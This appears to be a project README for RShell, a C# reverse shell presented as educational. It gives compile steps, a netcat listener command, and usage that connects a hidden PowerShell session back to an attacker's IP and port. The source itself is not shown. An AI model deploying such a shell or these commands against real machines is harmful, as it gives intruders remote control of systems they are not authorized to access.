# RShell (C# Reverse Shell)

RShell is a simple reverse shell implementation written in **C#**.  
This project was created **strictly for educational purposes** to demonstrate concepts related to networking, process handling, and inter-process communication in .NET.  

---

## ⚠️ Disclaimer
This tool is intended **only** for:  
- Learning how reverse shells work internally  
- Ethical research and penetration testing in environments you are **authorized** to test  
- Academic or controlled lab demonstrations  

🚫 **Do not use this code for unauthorized access, malicious activity, or in any environment where you don’t have explicit permission.**  
The author is **not responsible** for any misuse of this software.  

---

## ✨ Features
- Written in **C# (.NET)**  
- Connects back to a specified IP and port  
- Redirects input/output between the attacker’s console and the target system’s PowerShell  
- Handles both standard output and error streams  
- Lightweight and minimalistic design  

---

## 🛠️ Compilation
You can compile the project using:

### Visual Studio
1. Open the solution in Visual Studio.  
2. Build the project (Debug/Release).  
3. The executable will be available in the `bin` folder.  

### Command Line (csc)
If you have the .NET SDK or C# compiler installed, run:  
```bash
csc Program.cs -out:RShell.exe
🚀 Usage
Run the executable with the following syntax:

bash
Copy code
RShell.exe <ip> <port>
Example:

bash
Copy code
RShell.exe 127.0.0.1 4444
🧪 Safe Testing Setup
To test this project safely in a controlled environment, follow these steps:

1. Set up a listener (attacker machine)
Use Netcat or a similar tool:

bash
Copy code
nc -lvnp 4444
This will listen for incoming connections on port 4444.

2. Run RShell on the target (lab machine)
On your test machine, execute:

bash
Copy code
RShell.exe 127.0.0.1 4444
If testing across two different systems, replace 127.0.0.1 with the IP address of your listener machine.

3. Interact with the shell
Once connected, you’ll have an interactive PowerShell session redirected through the TCP connection.
Type exit to terminate the session.

⚠️ Reminder: Always test only in isolated environments that you fully control (VMs, local lab setup).

⚙️ How It Works
The client connects to a specified IP/port.

It spawns a hidden PowerShell process.

Standard input/output and error streams are redirected via TCP.

Commands sent from the listener are executed on the target system.

Output is sent back over the same TCP connection.

📚 Educational Value
This project can help you learn about:

TCP client-server communication in C#

Working with StreamReader and StreamWriter

Process handling and I/O redirection in .NET

Event-driven programming with OutputDataReceived
